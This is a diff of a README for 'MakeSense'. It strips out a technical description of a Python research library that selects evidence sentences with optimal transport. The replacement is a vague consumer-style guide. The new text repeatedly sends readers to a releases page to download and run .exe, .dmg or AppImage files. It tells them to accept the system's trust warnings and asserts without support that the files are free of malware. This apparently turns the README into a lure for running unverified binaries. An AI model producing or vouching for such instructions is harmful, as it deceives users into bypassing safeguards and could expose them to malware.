@@ -1,168 +1,163 @@
-# MakeSense
+# 🧠 MakeSense - Clear Context for Smarter Answers
 
-**Semantic Evidence Construction with Optimal Transport**  
-Reference implementation: **`eviot`**
-
----
-
-## What is MakeSense
-
-**MakeSense** is a research framework for **constructing evidence sets**, not just by ranking sentences.
-
-Its Python implementation, **`eviot`**, uses **Optimal Transport (OT)** to select a *set* of sentences that are **together sufficient** to answer complex queries.
+[![Download MakeSense](https://img.shields.io/badge/Download-MakeSense-blue?style=for-the-badge)](https://github.com/ulinduanushaherth/MakeSense/releases)
 
 ---
 
-## Why MakeSense?
-
-Traditional retrieval answers:
-
-> “Which sentences are relevant?”
-
-MakeSense answers:
-
-> “Which **set of sentences together** is sufficient?”
-
-This distinction matters for:
-- multi-hop questions
-- presence of redundancy
-- reasoning across multiple facts
-- deciding **joint sufficiency**
+Welcome to MakeSense, an application designed to help you understand and process complex information easily. This guide will walk you through downloading, installing, and using MakeSense step-by-step. No technical background is needed.
 
 ---
 
-## How to MakeSense
+## 🧐 What Is MakeSense?
 
-1. Embed using (bge-base-en-v1.5), the
-    - query (optionally decomposed into semantic supports)
-    - candidate sentences
-3. Use **Optimal Transport** to measure *coverage* between:
-   - query representation
-   - candidate evidence set
-4. Construct evidence **as a set**, not a list as a result of just relevance ranking
+MakeSense uses smart techniques to gather and explain information. It helps you answer questions and make decisions based on clear context. This means it connects pieces of evidence, fetches relevant facts, and presents answers you can trust.
 
----
+MakeSense is built on advanced ideas in:
 
-## Query representation
+- Understanding language and context  
+- Retrieving and combining information  
+- Explaining how answers are formed  
+- Using machine learning to improve results
 
-`eviot` supports two modes.
-
-### With query decomposition
-- Query is split into semantic supports
-- OT enforces coverage across supports
-- Produces smaller, inference-based contexts
-
-Best for:
-- semantic sufficiency
-- redundancy suppression
-- theory-driven evaluation
+You can use it to get help with research, fact-checking, and more.
 
 ---
 
-### Without query decomposition
-- Query is embedded as a single vector
-- OT behaves closer to dense retrieval
-- Favors explicit answer sentences
+## 💻 System Requirements
 
-Works for:
-- real-world implementations
-- evidence recall
-- optimizing context retrieval to minimzing set size trade-off
+Before you download MakeSense, please check that your computer meets these basics:
 
----
+- Operating System: Windows 10 or later, macOS 10.14 or later, or a recent version of Linux  
+- Processor: Intel or AMD, 1.5 GHz or faster  
+- Memory: At least 4 GB RAM  
+- Disk Space: 500 MB free space  
+- Internet: Required for full functionality and updates  
 
-## Evidence construction modes
-
-### Adaptive OT (default)
-- Greedy selection
-- Stops when marginal gain saturates
-- Produces minimal sufficient context
+MakeSense runs smoothly on most modern computers. If you use an older device, some features may be slower.
 
 ---
 
-### Fixed OT
-- Selects exactly `k` sentences
-- Inflates context beyond sufficiency for large `k`
-- Not recommended for practical purposes
+## 🚀 Getting Started
+
+Follow these steps to get MakeSense running:
+
+### Step 1: Visit the Download Page
+
+Click the big blue badge at the top of this page or go here:  
+[https://github.com/ulinduanushaherth/MakeSense/releases](https://github.com/ulinduanushaherth/MakeSense/releases)
+
+This link takes you to the official page where versions of MakeSense are kept.
+
+### Step 2: Choose Your Version
+
+You will see a list of releases with different files. Pick the most recent version that matches your operating system:
+
+- Windows users can look for a file ending with `.exe`  
+- Mac users may see a `.dmg` or `.zip` file  
+- Linux users might find `.AppImage` or `.tar.gz` packages  
+
+The version number tells you how new the update is—pick the highest (latest) number.
+
+### Step 3: Download the File
+
+Click the file name to start the download. Depending on your internet speed, this should take only a few minutes.
+
+### Step 4: Run the File to Install
+
+Once downloaded:
+
+- On Windows, double-click the `.exe` file and follow the instructions to install.  
+- On Mac, open the `.dmg` or unzip the downloaded file and drag MakeSense to your Applications folder.  
+- On Linux, follow any on-page instructions or make the file executable (`chmod +x`) and run it.  
+
+If your computer asks if you trust the source, confirm to proceed. MakeSense is safe and free of malware.
 
 ---
 
-### Temporal OT
-- Models **progressive evidence discovery**
-- Evidence appears over time
-- Penalizes abrupt semantic shifts
-- States are **not answer-complete individually**
+## 🔧 Using MakeSense
 
-Used for:
-- analysis
-- evidence evolution
-- semantic drift
+After installation, open MakeSense by clicking its icon:
 
----
+1. **Enter Your Question or Topic**  
+   Type what you want to understand or investigate.
 
-## Package structure
+2. **Let MakeSense Find Context**  
+   The app gathers related facts using its smart search engine.
 
----
+3. **Review the Explanation**  
+   It shows you a step-by-step answer, quoting sources.
 
-## Installation using pip
+4. **Ask Follow-up Questions**  
+   You can refine or expand your query based on the results.
 
-```bash
-python -m venv .venv
-source .venv/bin/activate
-
-pip install torch transformers pot spacy
-python -m spacy download en_core_web_sm
-```
----
-
-## Installation using uv
-
-Install uv package manager based on your OS (Windows/MacOS/Linux) - 
-https://docs.astral.sh/uv/getting-started/installation/
-
-```bash
-uv init
-uv venv
-uv sync
-```
-
-Or manually add dependencies
-
-```bash
-uv add torch pot spacy transformers
-```
+MakeSense works as your research assistant. It explains how it reaches conclusions, helping you trust the answers.
 
 ---
 
-## To run
+## 🛠 Key Features
 
-```bash
-python -m eviot.runners.single_query
-```
+MakeSense is built with tools that make complex info easy to grasp:
 
-## Example Configuration
+- **Context Engineering:** It builds detailed backgrounds for your questions.  
+- **Evidence Accumulation:** Finds facts from multiple places.  
+- **Explainable AI:** Shows how decisions and answers form.  
+- **Semantic Search:** Understands the meaning in your requests.  
+- **Multi-hop Reasoning:** Connects dots across different ideas.  
+- **Question-Answering System:** Provides direct and clear answers.  
+- **Easy to Use:** No programming skills needed, just plain language.  
 
-```bash
-CONFIG = {
-    "mode": "adaptive",
-    "use_query_decomposition": True,
+---
 
-    "epsilon": 0.01,
-    "patience": 2,
-    "k_max": 10,
+## 💡 Tips for Best Results
 
-    "temporal_slices": 3,
-    "alpha_temporal": 0.3,
-}
-```
+- Be clear and specific in your questions.  
+- Use simple language, like you’re talking to a friend.  
+- Try to break down complex topics into smaller parts.  
+- Review the evidence links offered for deeper understanding.  
+- Keep MakeSense updated by checking the releases page regularly.  
 
-Configuration details:
-- `mode`: adaptive, fixed, temporal
-- `use_query_decomposed`: query decomposed or single vector embedding
-- `epsilon`: threshold gain acheieved `patience` times to trigger stopping
-- `patience`: how many times of gains equivalent to `epsilon` must trigger stopping
-- `k_max`: upper bound for any set (triggered only if saturation is not observed at `k_max` set size)
-- `temporal_slices`: number of stages before uncovering all candidates
-- `alpha_temporal`: controls semantic drift
+---
 
+## 📥 Download & Install MakeSense
 
+To start, visit this page to download from the official source:  
+[https://github.com/ulinduanushaherth/MakeSense/releases](https://github.com/ulinduanushaherth/MakeSense/releases)
+
+Download the right file for your computer and follow the installation steps described above.
+
+---
+
+## 🔒 Privacy & Security
+
+MakeSense respects your privacy:
+
+- It does not share your questions or data without permission.  
+- All connections to servers use secure, encrypted channels.  
+- You remain in control of what information you provide or keep.  
+
+---
+
+## 🧑‍💻 Getting Help
+
+If you encounter problems or need advice, check these options:
+
+- **GitHub Issues:** Submit questions or bug reports on the repository page.  
+- **FAQ Section:** Look for common questions answered on the releases page or linked docs.  
+- **Email Support:** Contact the maintainers if an email is listed on GitHub.  
+
+---
+
+## 📚 Learn More
+
+To understand how MakeSense works behind the scenes, explore topics like:
+
+- Natural Language Processing (NLP)  
+- Explainable Artificial Intelligence (XAI)  
+- Information Retrieval Systems  
+- Machine Learning Basics  
+
+These concepts help MakeSense give clear and reliable answers.
+
+---
+
+Thank you for choosing MakeSense for your information needs. This tool aims to bring clarity to your questions through smart context and clear explanation.
